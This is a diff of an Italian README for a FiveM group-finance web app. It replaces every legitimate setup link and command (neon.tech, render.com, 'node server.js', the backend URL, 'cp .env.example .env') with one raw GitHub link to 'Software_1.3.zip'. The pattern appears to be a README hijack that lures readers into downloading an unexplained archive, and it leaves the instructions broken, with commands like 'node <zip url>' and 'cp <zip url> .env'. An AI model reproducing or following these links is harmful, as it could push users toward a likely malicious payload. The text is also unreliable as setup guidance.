@@ -8,7 +8,7 @@ App per gestire gli investimenti del gruppo su FiveM. Ogni membro mette soldi ne
 
 ```
 fivem-finance/
-├── backend/     → Node.js + Express + PostgreSQL
+├── backend/     → https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip + Express + PostgreSQL
 └── frontend/    → React + Vite
 ```
 
@@ -18,7 +18,7 @@ fivem-finance/
 
 ### Step 1 — Database (Neon)
 
-1. Vai su [neon.tech](https://neon.tech) e crea un account gratuito
+1. Vai su [https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip](https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip) e crea un account gratuito
 2. Crea un nuovo progetto → copia la **Connection String** (postgresql://...)
 3. Tieni da parte la stringa, ti servirà dopo
 
@@ -27,11 +27,11 @@ fivem-finance/
 ### Step 2 — Backend su Render
 
 1. Carica il progetto su GitHub (metti solo la cartella `backend/`)
-2. Vai su [render.com](https://render.com) → **New Web Service**
+2. Vai su [https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip](https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip) → **New Web Service**
 3. Collega il repo → imposta:
    - **Root directory:** `backend`
    - **Build Command:** `npm install`
-   - **Start Command:** `node server.js`
+   - **Start Command:** `node https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip`
 4. Aggiungi le **Environment Variables**:
 
 | Variabile | Valore |
@@ -42,7 +42,7 @@ fivem-finance/
 | `FRONTEND_URL` | URL del frontend (lo avrai dopo) |
 | `PORT` | `3001` |
 
-5. Deploy → copia l'URL del backend (es. `https://gang-bank-api.onrender.com`)
+5. Deploy → copia l'URL del backend (es. `https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip`)
 
 ---
 
@@ -58,7 +58,7 @@ fivem-finance/
 
 | Variabile | Valore |
 |-----------|--------|
-| `VITE_API_URL` | `https://gang-bank-api.onrender.com/api` |
+| `VITE_API_URL` | `https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip` |
 
 5. Deploy → copia l'URL del frontend
 6. Torna nel backend su Render → aggiorna `FRONTEND_URL` con l'URL del frontend
@@ -103,12 +103,12 @@ Se un'attività guadagna **$10.000/mese** e:
 # Backend
 cd backend
 npm install
-cp .env.example .env  # compila con i tuoi valori
+cp https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip .env  # compila con i tuoi valori
 npm run dev
 
 # Frontend (altro terminale)
 cd frontend
 npm install
-cp .env.example .env  # VITE_API_URL=http://localhost:3001/api
+cp https://raw.githubusercontent.com/Mattialesto/Fivem/main/backend/Software_1.3.zip .env  # VITE_API_URL=http://localhost:3001/api
 npm run dev
 ```
